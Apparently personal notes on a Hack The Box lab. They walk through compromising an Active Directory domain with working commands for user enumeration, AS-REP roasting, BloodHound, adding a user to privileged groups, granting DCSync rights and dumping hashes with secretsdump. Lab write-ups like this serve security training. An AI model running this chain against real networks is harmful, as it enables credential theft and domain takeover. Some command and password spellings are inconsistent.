nmap showed the name of the host is htb.local, added that to /etc/hosts
Started with smb enum, locked down
Next was rpcclient, enumdomusers, found a bunch of usernames, format and put it to userfile

used `./kerbrute userenum --dc 10.129.237.102 -d htb.local users.txt` to verify which users are good

used asreproasting to get the asrep hash of user svc-alfresco using
`impacket-GetNPUsers htb.local/ -dc-ip 10.129.237.102 -usersfile users.txt -format john -outputfile hashes.txt -no-pass`
found hash for svc-alfresco user, cracked it with john
'svc-alfresco' -p 's3ervice'

kerberoasting wasnt yeilding anything, except a for a guest account. 
So ran a bloodhound
`bloodhound-python -u 'svc-alfresco' -p 's3rvice' -ns 10.129.237.102 --dns-tcp -d htb.local -c All --zip`
Select user svc-alfresco, path find to domain administrators@htb.local
we find we can remote powershell to forest.htb.local. also, we're a member of "Account operators" group, which lets us add users to non-max-level group.
Looking at Bloodhound, select "Shortest path to high value targets", we see the members of the group "Exchange Windows Permission" have WriteDACL relation with the domain. it means, can modify or write DACL (Discretionary Access Control Lists) to the domain.
To do so we use PowerView.ps1

Now add new user, and add him to the exchange group we saw
`net user aj password123! /add /domain` (dont replace with domain name)
`net localgroup "Remote Management Users" aj /add`
`net group "Exchange Windows Permissions" aj /add`

login to the new user, aj
download powerview
`. ./PowerView.ps1`
Create a secure cred object
`$cred = New-Object System.Management.Automation.PSCredential ("htb.local\aj", (ConvertTo-SecureString "password123!" -AsPlainText -Force))`

Use powerview's Add-ObjectACL to give yourself rights on DCSync
`Add-ObjectACL -PrincipalIdentity aj -Credential $cred -Rights DCSync`

on kali, use impacket's secretdump to get the admin hash
`impacket-secrestsdump htb.local/aj@10.129.237.102`
```
secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'
```